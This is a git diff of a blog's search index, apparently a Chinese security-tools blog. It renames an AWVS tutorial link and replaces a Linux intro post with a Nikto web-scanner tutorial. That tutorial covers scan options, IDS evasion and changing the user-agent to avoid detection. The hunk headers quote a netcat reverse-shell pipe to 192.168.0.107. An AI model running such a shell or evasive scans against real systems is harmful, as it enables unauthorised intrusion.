@@ -254,7 +254,7 @@ kali：nc 192.168.0.107 4444 | /bin/bash | nc 192.168.0.107 4445
   </entry>
   <entry>
     <title>AWVS扫描使用教程</title>
-    <url>/2023/04/01/awvs-sao-miao-shi-yong-jiao-cheng/</url>
+    <url>/2023/04/01/awvs-shi-yong-jiao-cheng/</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="AWVS-Web-Scanner使用教程"><a href="#AWVS-Web-Scanner使用教程" class="headerlink" title="AWVS-Web Scanner使用教程"></a><em>AWVS-Web Scanner使用教程</em></h1><p>Acunetix是道德黑客用来阻止恶意攻击者获得未经授权访问的自动化工具。JavaScript、HTML5和单页应用程序都可以作为安全扫描器被它扫描。它可以保护web应用程序免受一些网络缺陷的影响。</p>
 <p>主要特点：</p>
 <ul>
@@ -298,26 +298,50 @@ kali：nc 192.168.0.107 4444 | /bin/bash | nc 192.168.0.107 4445
       </tags>
   </entry>
   <entry>
-    <title>linux</title>
-    <url>/2022/08/12/linux/</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote>
-<blockquote>
-<p>Linux 内核最初只是由芬兰人林纳斯·托瓦兹（Linus Torvalds）在赫尔辛基大学上学时出于个人爱好而编写的。</p>
-</blockquote>
-</blockquote>
-<p>Linux 是一套免费使用和自由传播的类 Unix 操作系统，是一个基于 POSIX 和 UNIX 的多用户、多任务、支持多线程和多 CPU 的操作系统。</p>
-<p>Linux 能运行主要的 UNIX 工具软件、应用程序和网络协议。它支持 32 位和 64 位硬件。Linux 继承了 Unix 以网络为核心的设计思想，是一个性能稳定的多用户网络操作系统。</p>
-<pre class=" language-bash"><code class="language-bash">$ hexo server
-</code></pre>
-<p><img src="https://t7.baidu.com/it/u=3930750564,2979238085&fm=193&f=GIF" alt="这是封面"></p>
-<p><img src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fimg.jj20.com%2Fup%2Fallimg%2F4k%2Fs%2F02%2F210924223450D25-0-lp.jpg&refer=http%3A%2F%2Fimg.jj20.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=auto?sec=1662899151&t=c4b3dc1cbeb0fff8b0988f565417991e" alt="看看这个能成功不"></p>
-<div id="dplayer0" class="dplayer" style="margin-bottom: 20px;"></div><script>var dplayer0 = new DPlayer({"element":document.getElementById("dplayer0"),"autoplay":0,"theme":"#FADFA3","loop":1,"video":{"url":"https://moeplayer.b0.upaiyun.com/dplayer/hikarunara.mp4","pic":"https://moeplayer.b0.upaiyun.com/dplayer/hikarunara.jpg"},"danmaku":{"api":"https://api.prprpr.me/dplayer3/","id":"9E2E3368B56CDBB4","token":"tokendemo","addition":["https://api.prprpr.me/dplayer3/v2/bilibili?aid"]}});</script><!-- dplayer used1 -->  
-<div id="dplayer1" class="dplayer" style="margin-bottom: 20px;"></div><script>var dplayer1 = new DPlayer({"element":document.getElementById("dplayer1"),"autoplay":1,"video":{"url":"some.mp4"},"danmaku":{"api":"https://api.prprpr.me/dplayer/","id":"someid","addition":["/some.json"]}});</script><!-- dplayer used1 -->]]></content>
+    <title>Nikto详细使用教程</title>
+    <url>/2022/08/12/nikto-shi-yong-jiao-cheng/</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="Nikto"><a href="#Nikto" class="headerlink" title="Nikto"></a>Nikto</h1><p>基于perl语言开发的web页面扫描器。其特点扫描全面，速度快。</p>
+<h2 id="nikto常用命令"><a href="#nikto常用命令" class="headerlink" title="nikto常用命令"></a>nikto常用命令</h2><p>-upodate                         升级，更新插件</p>
+<p>-host                               扫描目标URl</p>
+<p>-id username:password  http认证接口</p>
+<p>-list-plugins                     列出所有可用的插件</p>
+<p>-evasion                          IDS&#x2F;IPS逃避技术（实例演示里有详细信息）</p>
+<p>-port                                指定端口（默认80）</p>
+<p> -ssl                                 使用SSL</p>
+<p>-useproxy                       使用http代理</p>
+<p>-vhost  域名                    当一个IP拥有多个网站时 使用</p>
+<h2 id="nikto交互参数（扫描过程中使用）"><a href="#nikto交互参数（扫描过程中使用）" class="headerlink" title="nikto交互参数（扫描过程中使用）"></a>nikto交互参数（扫描过程中使用）</h2><p>空格        报告当前扫描状态</p>
+<p>v             显示详细信息</p>
+<p>d             显示调试信息</p>
+<p>e             显示http错误信息</p>
+<p>p             显示扫描进度</p>
+<p>r              显示重定向信息</p>
+<p>c             显示cookie</p>
+<p>a             显示身份认证过程</p>
+<p>q             退出程序</p>
+<p>N            扫描下一个目标</p>
+<p>P            暂停扫描</p>
+<p><strong>1.扫描单个地址时</strong></p>
+<p>nikto  -host <a href="http://192.168.0.3/">http://192.168.3</a></p>
+<p><img src="https://res.cloudinary.com/dg3ytsk4a/image/upload/v1686192629/n1_iycdpf.png"></p>
+<p><strong>2.扫描多个地址时</strong></p>
+<p>nikto -host  url.txt</p>
+<p><img src="https://res.cloudinary.com/dg3ytsk4a/image/upload/v1686192749/n2_kze1fv.png"></p>
+<p><strong>3.扫描https网站</strong></p>
+<p>nikto  -host  <a href="http://www.baidu.com/">www.baidu.com</a>  -ssl  -port 443</p>
+<p><img src="https://res.cloudinary.com/dg3ytsk4a/image/upload/v1686192819/n3_jyryez.png"></p>
+<h3 id="修改配置信息"><a href="#修改配置信息" class="headerlink" title="修改配置信息"></a>修改配置信息</h3><p><strong>1.将user-agent:nikto改为其他浏览器标识，避免被识别出来。</strong></p>
+<p> vi &#x2F;etc&#x2F;nikto.conf</p>
+<p><img src="https://res.cloudinary.com/dg3ytsk4a/image/upload/v1686193056/n4_lqcvki.png"></p>
+<p><strong>2.如果是基于表单的认证，必须要使用cookie，将原来的cookie注释，按照原来的格式写入你的cookie。</strong></p>
+<p>STATIC-COOKIE &#x3D; “cooke1&#x3D;cookie value1”; “cookie2&#x3D;value2”； </p>
+<p><img src="https://res.cloudinary.com/dg3ytsk4a/image/upload/v1686193134/n5_xza91k.png"></p>
+]]></content>
       <categories>
-        <category>操作系统</category>
+        <category>黑客工具</category>
       </categories>
       <tags>
-        <tag>kali Linux</tag>
+        <tag>Nikto</tag>
       </tags>
   </entry>
 </search>
